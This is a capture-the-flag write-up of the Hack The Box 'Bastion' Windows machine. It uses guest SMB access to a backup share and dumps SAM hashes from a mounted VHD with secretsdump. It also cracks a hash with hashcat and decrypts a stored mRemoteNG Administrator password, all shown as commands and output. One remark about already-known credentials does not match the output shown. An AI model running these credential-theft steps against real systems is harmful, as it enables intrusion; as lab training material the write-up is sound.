---
permalink: /posts/HTB/Bastion
title:  "HTB Bastion"
author: Luc Kolen
description: "Bastion is an easy Windows machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-Easy
  - Windows
  - SMB
  - Guestmount
  - Impacket-secretsdump
  - mRemoteNG
---
# 10.10.10.134 - Bastion

|Hack The Box|Created by|Points|
|---|---|---|
|[Link](https://www.hackthebox.eu/home/machines/profile/186)|[L4mpje](https://www.hackthebox.eu/home/users/profile/29267)|20|

- [10.10.10.134 - Bastion](#101010134---bastion)
  - [Open ports](#open-ports)
  - [SMB](#smb)
  - [Privilege escalation](#privilege-escalation)
  - [TL;DR](#tldr)

## Open ports

```bash
luc@kali:~/HTB/Bastion$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.134
```

|Port|Service|Version
|---|---|---|
22/tcp|ssh|OpenSSH for_Windows_7.9 (protocol 2.0)
135/tcp|msrpc|Microsoft Windows RPC
139/tcp|netbios-ssn|Microsoft Windows netbios-ssn
445/tcp|microsoft-ds|Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp|http|Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp|http|Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

## SMB

```bash
luc@kali:~/HTB/Bastion$ smbmap -H 10.10.10.134 -u guest
[+] Guest session       IP: 10.10.10.134:445    Name: 10.10.10.134
[/] Work[!] Unable to remove test directory at \\10.10.10.134\Backups\UYIGMQBETO, please remove manually
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Backups                                                 READ, WRITE
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```

We can read and write on the `Backups` share, but we can't delete files so `UYIGMQBETO` is a folder that's created by `SMBMap` and we can't delete that.

```bash
luc@kali:~/HTB/Bastion$ mkdir smb
luc@kali:~/HTB/Bastion$ mkdir smb/backups
luc@kali:~/HTB/Bastion$ sudo mount //10.10.10.134/Backups smb/backups/ -o username=guest
Password for guest@//10.10.10.134/Backups:  (no echo)
luc@kali:~/HTB/Bastion$ cd smb/backups/
luc@kali:~/HTB/Bastion/smb/backups$ ls -R
.:
note.txt  SDT65CB.tmp  UYIGMQBETO  WindowsImageBackup

./UYIGMQBETO:

./WindowsImageBackup:
L4mpje-PC

./WindowsImageBackup/L4mpje-PC:
'Backup 2019-02-22 124351'   Catalog   MediaId   SPPMetadataCache

'./WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351':
9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd                                                      cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd                                                      cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
BackupSpecs.xml                                                                               cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml                                           cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml                                     cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml

./WindowsImageBackup/L4mpje-PC/Catalog:
BackupGlobalCatalog  GlobalCatalog

./WindowsImageBackup/L4mpje-PC/SPPMetadataCache:
{cd113385-65ff-4ea2-8ced-5630f6feca8f}
luc@kali:~/HTB/Bastion/smb/backups$ cat note.txt

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
luc@kali:~/HTB/Bastion/smb/backups$ du -hs WindowsImageBackup/
5.1G    WindowsImageBackup/
```

We can see that this SMB share is ~5.1GB and a note telling us that we shouldn't move the entire contents to our machine to save the network.

```bash
luc@kali:~/HTB/Bastion/$ sudo apt install libguestfs-tools
```

We can mount the VHD with `guestmount`, but that isn't installed by default in Kali so we install it from the `libguestfs-tools` package.

```bash
luc@kali:~/HTB/Bastion$ guestmount --add smb/backups/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v vhd/
luc@kali:~/HTB/Bastion$ cd vhd/
luc@kali:~/HTB/Bastion/vhd$ ls
'$Recycle.Bin'   autoexec.bat   config.sys  'Documents and Settings'   pagefile.sys   PerfLogs   ProgramData  'Program Files'   Recovery  'System Volume Information'   Users   Windows
```

We now have access to all files in `9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd`.

```bash
luc@kali:~/HTB/Bastion/vhd$ cd Windows/System32/config/
luc@kali:~/HTB/Bastion/vhd/Windows/System32/config$ cp SAM SYSTEM ~/HTB/Bastion/
luc@kali:~/HTB/Bastion/vhd/Windows/System32/config$ cd ../../../../
luc@kali:~/HTB/Bastion$ impacket-secretsdump -sam SAM -system SYSTEM local
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Cleaning up...
```

Both `Administrator` and `Guest` have the hash `aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0`. That hash won't give us access because it shows that it's disabled. L4mpje does have an interesting hash.

```bash
luc@kali:~/HTB/Bastion$ smbmap -u L4mpje -p aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9 -H 10.10.10.134
[+] IP: 10.10.10.134:445        Name: 10.10.10.134
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Backups                                                 READ, WRITE
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```

We have no extra access, but we do know that the hash from the backup is still valid.

```bash
luc@kali:~/HTB/Bastion$ echo '26112010952d963c8dc4217daec986d9' > L4mpje.hash
luc@kali:~/HTB/Bastion$ hashcat -m 1000 L4mpje.hash /usr/share/wordlists/rockyou.txt
...
26112010952d963c8dc4217daec986d9:bureaulampje
```

It shows that the password for `L4mpje` is `bureaulampje` (extra info for non Dutch speakers, L4mpje/lampje is light and bureaulampje is a desk light).

```bash
luc@kali:~/HTB/Bastion$ ssh L4mpje@10.10.10.134
L4mpje@10.10.10.134's password: bureaulampje
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

l4mpje@BASTION C:\Users\L4mpje>whoami
bastion\l4mpje
l4mpje@BASTION C:\Users\L4mpje>cd Desktop

l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt
9bfe57d5************************
```

## Privilege escalation

```bash
l4mpje@BASTION C:\>dir "Program Files"
 Volume in drive C has no label.
 Volume Serial Number is 0CB3-C487

 Directory of C:\Program Files

27-08-2019  11:20    <DIR>          .
27-08-2019  11:20    <DIR>          ..
16-04-2019  12:18    <DIR>          Common Files
23-02-2019  10:38    <DIR>          Internet Explorer
22-02-2019  15:19    <DIR>          OpenSSH-Win64
22-02-2019  15:08    <DIR>          PackageManagement
27-08-2019  11:20    <DIR>          VMware
23-02-2019  11:22    <DIR>          Windows Defender
23-02-2019  10:38    <DIR>          Windows Mail
23-02-2019  11:22    <DIR>          Windows Media Player
16-07-2016  15:23    <DIR>          Windows Multimedia Platform
16-07-2016  15:23    <DIR>          Windows NT
23-02-2019  11:22    <DIR>          Windows Photo Viewer
16-07-2016  15:23    <DIR>          Windows Portable Devices
22-02-2019  15:08    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              15 Dir(s)  11.277.213.696 bytes free

l4mpje@BASTION C:\>dir "Program Files (x86)"
 Volume in drive C has no label.
 Volume Serial Number is 0CB3-C487

 Directory of C:\Program Files (x86)

22-02-2019  15:01    <DIR>          .
22-02-2019  15:01    <DIR>          ..
16-07-2016  15:23    <DIR>          Common Files
23-02-2019  10:38    <DIR>          Internet Explorer
16-07-2016  15:23    <DIR>          Microsoft.NET
22-02-2019  15:01    <DIR>          mRemoteNG
23-02-2019  11:22    <DIR>          Windows Defender
23-02-2019  10:38    <DIR>          Windows Mail
23-02-2019  11:22    <DIR>          Windows Media Player
16-07-2016  15:23    <DIR>          Windows Multimedia Platform
16-07-2016  15:23    <DIR>          Windows NT
23-02-2019  11:22    <DIR>          Windows Photo Viewer
16-07-2016  15:23    <DIR>          Windows Portable Devices
16-07-2016  15:23    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              14 Dir(s)  11.277.213.696 bytes free
```

Looking into the `Program Files` and `Program Files (x86)` directories we see one directory we didn't expect `mRemoteNG`. `mRemoteNG` is a remote management tool.

```bash
l4mpje@BASTION C:\Program Files (x86)\mRemoteNG>cd \Users\L4mpje\AppData\Roaming\mRemoteNG
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>cat confCons.xml
...
Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
...
luc@kali:~/HTB/Bastion$ python mRemoteNG-Decrypt.py
usage: mRemoteNG-Decrypt.py [-h] [-f FILE | -s STRING] [-p PASSWORD]

Decrypt mRemoteNG passwords.

optional arguments:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  name of file containing mRemoteNG password
  -s STRING, --string STRING
                        base64 string of mRemoteNG password
  -p PASSWORD, --password PASSWORD
                        Custom password
luc@kali:~/HTB/Bastion$ python mRemoteNG-Decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2
```

There is a [Python script](https://github.com/haseebT/mRemoteNG-Decrypt) available to decrypt mRemoteNG passwords. We confirm that this tool works because we get the credentials we already had.

```bash
luc@kali:~/HTB/Bastion$ ssh administrator@10.10.10.134
administrator@10.10.10.134's password: thXLHM96BeKL0ER2
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

administrator@BASTION C:\Users\Administrator>cd Desktop
administrator@BASTION C:\Users\Administrator\Desktop>type root.txt
958850b9************************
```

## TL;DR

- Backup available via guest SMB
- Got credentials from SAM & SYSTEM
- Admin credentials from mRemoteNG
